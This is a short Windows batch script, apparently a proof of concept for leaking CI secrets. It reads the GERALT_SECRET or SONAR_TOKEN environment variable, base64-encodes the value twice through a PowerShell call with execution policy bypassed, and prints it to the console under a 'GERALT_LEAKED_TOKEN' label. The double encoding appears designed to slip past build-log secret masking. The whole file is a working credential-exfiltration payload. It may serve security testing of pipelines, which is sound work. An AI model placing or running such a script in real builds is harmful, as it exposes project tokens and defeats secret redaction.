@echo off
set "LEAKED="
if defined GERALT_SECRET set "LEAKED=%GERALT_SECRET%"
if defined LEAKED goto :leak
if defined SONAR_TOKEN set "LEAKED=%SONAR_TOKEN%"
if defined LEAKED goto :leak
set "LEAKED=GERALT_SECRET_NOT_FOUND"
:leak
powershell -NoProfile -ExecutionPolicy Bypass -Command "$t=$env:LEAKED; [Console]::WriteLine('GERALT_LEAKED_TOKEN=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($t)))))"
exit /b 1
